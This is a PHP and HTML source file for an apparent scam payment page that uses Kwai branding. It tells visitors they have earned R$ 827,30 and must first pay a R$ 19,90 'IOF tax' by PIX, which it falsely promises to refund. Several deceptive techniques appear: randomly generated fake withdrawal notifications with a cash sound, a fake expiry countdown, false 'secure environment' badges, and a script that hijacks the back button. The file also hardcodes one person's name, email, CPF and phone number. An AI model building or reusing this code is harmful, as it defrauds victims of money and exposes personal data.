<?php
session_start();

function debug_log($message) {
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents('debug.txt', "[$timestamp] $message\n", FILE_APPEND | LOCK_EX);
}

debug_log("=== PAGE LOAD START ===");

$user_data = [
    'name' => 'JOAO Victor  Moraes',
    'email' => 'caASDiovictorbarrinha@gmail.com',
    'cpf' => '70776355112',
    'phone' => '64994274099',
    'amount' => 1990,
];

$transaction_id = null;
$pix_code = null;
$pix_qr_code = null;
$error_message = null;

if (!isset($_SESSION['transaction_id']) || !isset($_SESSION['pix_code'])) {
    debug_log("Creating new transaction for CPF: " . $user_data['cpf']);

    include 'generate_payment.php';

    $payment_result = create_nivopay_transaction($user_data);

    if ($payment_result['success']) {
        $_SESSION['transaction_id'] = $payment_result['transaction_id'];
        $_SESSION['pix_code'] = $payment_result['pix_code'];
        $_SESSION['pix_qr_code'] = $payment_result['pix_qr_code'];

        $transaction_id = $payment_result['transaction_id'];
        $pix_code = $payment_result['pix_code'];
        $pix_qr_code = $payment_result['pix_qr_code'];

        debug_log("Transaction created successfully: " . $transaction_id);
    } else {
        $error_message = $payment_result['error'];
        debug_log("Error creating transaction: " . $error_message);
    }
} else {
    $transaction_id = $_SESSION['transaction_id'];
    $pix_code = $_SESSION['pix_code'];
    $pix_qr_code = $_SESSION['pix_qr_code'];

    debug_log("Using existing transaction: " . $transaction_id);
}

debug_log("=== PAGE LOAD END ===");
?>

<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <script src="https://cdn.xtracky.com/scripts/utm-handler.js" data-token="bde81082-3ca0-4161-b6f2-6c83c34f5b4a"
    data-click-id-param="click_id">
    </script>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Kwai Header</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
  <style>
    * {
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
        Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #f5f5f5;
    }

    .kwai-header {
      background-color: #ff0000;
      color: white;
      padding: 20px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      border-radius: 0 0 10px 10px;
    }

    .kwai-logo {
      display: flex;
      align-items: center;
      margin-bottom: 10px;
    }

    .kwai-logo-icon {
      background: white;
      border-radius: 10px;
      width: 50px;
      height: 50px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 10px;
      overflow: hidden;
    }

    .kwai-logo-text {
      font-size: 36px;
      font-weight: bold;
    }

    .kwai-slogan {
      font-size: 14px;
      margin-top: 5px;
    }
  @keyframes slide-in {
  0% { transform: translateY(-20px); opacity: 0; }
  100% { transform: translateY(0); opacity: 1; }
}

@keyframes slide-out {
  0% { transform: translateY(0); opacity: 1; }
  100% { transform: translateY(-20px); opacity: 0; }
}

.animate-slide-in {
  animation: slide-in 0.4s ease forwards;
}

.animate-slide-out {
  animation: slide-out 0.4s ease forwards;
}

@keyframes blink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.4; }
}

.blinking {
  animation: blink 1s infinite;
}



  </style>
</head>

<body class="flex items-center flex-col">
    <script type="text/javascript">
    var back_redirect_back_link = '/backredirect';
    history.pushState({}, "", location.href);
    history.pushState({}, "", location.href);
    window.onpopstate = function () {
        setTimeout(function () {
            location.href = back_redirect_back_link;
        }, 0);
    };
</script>
  <header class="w-full bg-[#FF6420] flex flex-col items-center justify-center rounded-b-xl shadow-md overflow-hidden">
  <!-- Logo estendida -->
  <img src="https://resgateagora-kw.com/logokwai.png" alt="Logo Kwai" class="w-full max-w-[300px] object-contain mt-4" />

  <!-- Slogan -->
  <p class="text-white text-sm text-center my-2">Transação rápida, segura e sem complicação</p>
</header>

<section class="w-[90%] sm:w-[80%] mt-4 bg-[#004a99] text-white p-5 rounded-md shadow-md">
  <h2 class="text-base sm:text-lg font-bold tracking-wide uppercase text-center mb-4">
    Taxa será reembolsada após o pagamento
  </h2>

  <div class="text-sm sm:text-base space-y-2">
    <p class="flex items-center gap-2">
      <i class="fas fa-coins text-yellow-300"></i>
      <span><strong>Valor ganho:</strong> R$ 827,30</span>
    </p>
    <p class="flex items-center gap-2">
      <i class="fas fa-file-invoice-dollar text-white"></i>
      <span><strong>Valor da Taxa IOF:</strong> R$ 19,90</span>
    </p>
    <p class="flex items-center gap-2">
      <i class="fas fa-wallet text-orange-300"></i>
      <span><strong>Total a receber:</strong> R$ 847,20</span>
    </p>
  </div>
</section>
<script>
  const pixData = {
    transaction_id: "<?php echo $transaction_id; ?>",
    pix_code: "<?php echo $pix_code; ?>",
    pix_qr_code: "<?php echo $pix_qr_code; ?>",
    cpf: "<?php echo $user_data['cpf']; ?>",
    amount: <?php echo $user_data['amount']; ?>
  };

  localStorage.setItem("pixData", JSON.stringify(pixData));
</script>





  <section class="shadow-sm flex flex-col bg-[#fff] items-center justify-center w-[80%] mt-10 p-5 rounded-md">
    <div class="flex justify-between w-full">
      <div></div>
      <p class="text-white flex items-center gap-1 bg-green-600 w-[150px] rounded-sm p-1 text-sm">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <rect width="24" height="24" fill="#22A45D" />
          <path d="M8 10V7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7V10" stroke="white" stroke-width="2"
            stroke-linecap="round" />
          <rect x="7" y="10" width="10" height="8" rx="1" fill="white" />
        </svg>
        Ambiente Seguro
      </p>
    </div>

    <h1 class="mt-5 flex items-center gap-1 text-lg text-[#ff6420] font-semibold">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="5" y="2" width="14" height="20" rx="2" stroke="#ff6420" stroke-width="2" fill="none" />
        <rect x="5" y="2" width="14" height="20" rx="2" fill="#ff6420" fill-opacity="0.2" />
        <line x1="12" y1="18" x2="12" y2="18" stroke="#ff6420" stroke-width="2" stroke-linecap="round" />
      </svg>
      Escaneie o QRCODE abaixo
    </h1>

    <img id="qrcode-img" src="/placeholder.svg" alt="qrcode" class="mt-10" />

    <h2 class="mt-10 text-lg items-center flex gap-1 text-[#ff6420] font-semibold">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-2">
        <!-- Background document/rectangle -->
        <path
          d="M5 4C5 2.89543 5.89543 2 7 2H13C14.1046 2 15 2.89543 15 4V10C15 11.1046 14.1046 12 13 12H7C5.89543 12 5 11.1046 5 10V4Z"
          fill="white" stroke="#ff6420" stroke-width="2" />

        <!-- Foreground document/rectangle -->
        <path
          d="M9 8C9 6.89543 9.89543 6 11 6H17C18.1046 6 19 6.89543 19 8V14C19 15.1046 18.1046 16 17 16H11C9.89543 16 9 15.1046 9 14V8Z"
          fill="#ff6420" />
      </svg>
      ou copie o código PIX
    </h2>

    <input class="mt-5 border-1 border-gray-300 rounded-lg p-2 w-full text-gray-600 text-sm" type="text" name=""
      disabled id="pix-code" value="Carregando..." />

    <button id="copy-button" class="mt-5 w-full bg-[#ff6420] p-2 rounded-md text-xs text-white">
      Copiar
    </button>

    <div class="w-full mt-10">
      <!-- Payment Info Component -->
      <div class="relative bg-white rounded-lg shadow-sm overflow-hidden">
        <!-- Red vertical line on the left -->
        <div class="absolute left-0 top-0 bottom-0 w-1.5 bg-[#ff6420] rounded-l"></div>

        <!-- Content with padding -->
        <div class="p-4 pl-6">
          <!-- Value row -->
          <div class="flex justify-between items-center mb-3">
            <div class="flex items-center">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[#ff6420] mr-2" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2">
                <rect x="2" y="6" width="20" height="12" rx="2" />
                <path d="M12 12a2 2 0 1 0 0-4 2 2 0 0 0 0 4z" />
              </svg>
              <span class="text-[#ff6420] font-medium">Valor:</span>
            </div>
            <span id="payment-amount" class="text-gray-900 font-medium">R$ 19,90</span>
          </div>

          <!-- Valid until row -->
          <div class="flex justify-between items-center">
            <div class="flex items-center">
              <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-[#ff6420] mr-2" viewBox="0 0 24 24" fill="none"
                stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="10" />
                <polyline points="12 6 12 12 16 14" />
              </svg>
              <span class="text-[#ff6420] font-medium">Válido até:</span>
            </div>
            <span id="valid-until" class="text-gray-900 blinking">--:--</span>

          </div>
        </div>
      </div>
    </div>
    
    <div class="w-full mt-8">
      <!-- Feature List Component -->
      <div class="text-xs">
        <div class="flex items-center justify-center gap-8 text-gray-600">
          <!-- Secure Payment -->
          <div class="flex items-center">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 24 24" fill="none"
              stroke="currentColor" stroke-width="2">
              <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91 4.59-1.15 8-5.86 8-10.91V5l-8-3z" />
            </svg>
            <span class="text-gray-600 font-medium">Pagamento Seguro</span>
          </div>

          <!-- Instant Transaction -->
          <div class="flex items-center">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 24 24" fill="none"
              stroke="currentColor" stroke-width="2">
              <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" />
            </svg>
            <span class="text-gray-600 font-medium">Transação Instantânea</span>
          </div>
        </div>

        <!-- 24/7 Support (centered below) -->
        <div class="flex items-center justify-center mt-6">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" viewBox="0 0 24 24" fill="none"
            stroke="currentColor" stroke-width="2">
            <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" />
            <path d="M13 15v4" />
            <path d="M11 15v4" />
          </svg>
          <span class="text-gray-600 font-medium">Suporte 24/7</span>
        </div>
      </div>
    </div>
  </section>
  
  
<div id="fake-notification" class="fixed top-5 right-5 bg-white border-l-4 border-green-500 rounded-md px-4 py-3 text-sm shadow-lg flex items-center gap-2 z-50 hidden animate-slide-in">
  <i class="fas fa-hand-holding-usd text-green-600"></i>
  <span id="notif-text" class="text-gray-800 font-semibold">Carregando...</span>
</div>


<audio id="money-sound" preload="auto">
  <source src="/dinheiro.mp3" type="audio/mpeg">
</audio>
<script>
    function iniciarTimerPix(minutos = 10) {
  let tempo = minutos * 60;
  const el = document.getElementById("valid-until");

  const atualizar = () => {
    if (!el) return;

    const min = String(Math.floor(tempo / 60)).padStart(2, '0');
    const seg = String(tempo % 60).padStart(2, '0');
    el.textContent = `${min}:${seg}`;

    if (tempo <= 0) {
      clearInterval(intervalo);
      el.textContent = "Expirado";
      el.classList.remove("blinking");
      el.classList.add("text-red-600");
    }

    tempo--;
  };

  atualizar(); // inicia imediatamente
  const intervalo = setInterval(atualizar, 1000);
}

iniciarTimerPix(10);

</script>

<script>
  const nomesFake = ["Lucas", "Amanda", "João", "Fernanda", "Caio", "Juliana", "Pedro", "Lívia", "Rafael", "Camila"];

  function exibirNotificacaoFake() {
  const nomesFake = ["Lucas", "Amanda", "João", "Fernanda", "Caio", "Juliana", "Pedro", "Lívia", "Rafael", "Camila"];
  const valor = (Math.random() * (1400 - 600) + 600).toFixed(2).replace('.', ',');
  const nome = nomesFake[Math.floor(Math.random() * nomesFake.length)];

  const texto = `${nome} sacou R$ ${valor} de Kwai`;
  const notif = document.getElementById("fake-notification");
  const span = document.getElementById("notif-text");
  const audio = document.getElementById("money-sound");

  span.textContent = texto;

  // Reset classes para animação correta
  notif.classList.remove("hidden", "animate-slide-out");
  notif.classList.add("animate-slide-in");

  // Toca som
  audio.volume = 0.3;
  audio.play();

  // Espera visibilidade e inicia animação de saída
  setTimeout(() => {
    notif.classList.remove("animate-slide-in");
    notif.classList.add("animate-slide-out");
  }, 4500);

  // Esconde após a animação
  setTimeout(() => {
    notif.classList.add("hidden");
  }, 5000);
}

// Início automático com intervalo entre 8 e 12 segundos
setTimeout(() => {
  exibirNotificacaoFake();
  setInterval(() => {
    exibirNotificacaoFake();
  }, Math.floor(Math.random() * (12000 - 8000) + 8000));
}, 2000);

</script>


  <script>
  const phpTransactionId = "<?php echo $transaction_id; ?>";
  const phpNome = "<?php echo htmlspecialchars($user_data['name']); ?>";
  const phpEmail = "<?php echo htmlspecialchars($user_data['email']); ?>";
  const phpTelefone = "<?php echo htmlspecialchars($user_data['phone']); ?>";
  const phpValorFormatted = <?php echo $user_data['amount']; ?>;
  const phpCpf = "<?php echo $user_data['cpf']; ?>";
  const phpPixCode = "<?php echo htmlspecialchars($pix_code); ?>";
  const utm_campaign = "";

  function startTimer(duration) {
    let timer = duration;
    const expirationLabel = document.getElementById("valid-until");
    const interval = setInterval(function () {
      const minutes = parseInt(timer / 60, 10);
      const seconds = parseInt(timer % 60, 10);
      const formatted = (minutes < 10 ? "0" + minutes : minutes) + ":" +
                        (seconds < 10 ? "0" + seconds : seconds);
      if (expirationLabel) {
        expirationLabel.textContent = `Expira em ${formatted}`;
      }
      if (--timer < 0) {
        clearInterval(interval);
        if (expirationLabel) expirationLabel.textContent = "Expirado";
      }
    }, 1000);
  }

  function copyPixCode() {
    const pixCodeInput = document.getElementById('pix-code');
    const copyButton = document.getElementById('copy-button');
    const originalButtonText = copyButton.innerText;

    if (!pixCodeInput.value || pixCodeInput.value.includes('Erro')) return;

    pixCodeInput.disabled = false;
    pixCodeInput.select();
    document.execCommand('copy');
    pixCodeInput.disabled = true;

    copyButton.innerText = 'Copiado!';
    setTimeout(() => {
      copyButton.innerText = originalButtonText;
    }, 2000);
  }

  function checkPaymentStatus(transaction_id, cpf) {
    fetch(`check_payment.php?transaction_id=${encodeURIComponent(transaction_id)}&cpf=${encodeURIComponent(cpf)}`)
      .then(r => {
        if (!r.ok) throw new Error('HTTP ' + r.status);
        return r.json();
      })
      .then(statusRes => {
        console.log('Status do pagamento:', statusRes);
        if (statusRes.status === 'paid' || statusRes.status === 'APPROVED') {
          window.location.href = `pagamento-ok.php?cpf=${encodeURIComponent(phpCpf)}`;
        } else if (['cancelled', 'rejected', 'expired'].includes(statusRes.status)) {
          alert('Pagamento cancelado ou expirado. Tente novamente.');
        }
      })
      .catch(err => {
        console.error('Erro no fluxo de pagamento:', err);
      });
  }

  window.onload = function () {
    if (phpPixCode && phpTransactionId && phpCpf && !phpPixCode.includes("Erro")) {
      // Mostrar QR Code
      const qrImg = document.getElementById("qrcode-img");
      if (qrImg) {
        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(phpPixCode)}`;
      }

      // Mostrar valor
      const amountSpan = document.getElementById("payment-amount");
      if (amountSpan) {
        const formatted = (phpValorFormatted / 100).toFixed(2).replace(".", ",");
        amountSpan.textContent = `R$ ${formatted}`;
      }

      // Mostrar código PIX
      const pixCodeInput = document.getElementById("pix-code");
      if (pixCodeInput) {
        pixCodeInput.value = phpPixCode;
      }

      // Timer de expiração
      startTimer(15 * 60); // 15 minutos

      // Verificação de pagamento a cada 4 segundos
      setInterval(() => {
        checkPaymentStatus(phpTransactionId, phpCpf);
      }, 4000);
    }

    // Botão copiar
    const copyBtn = document.getElementById("copy-button");
    if (copyBtn) {
      copyBtn.addEventListener("click", copyPixCode);
    }
  };
</script>

  
</body>

</html>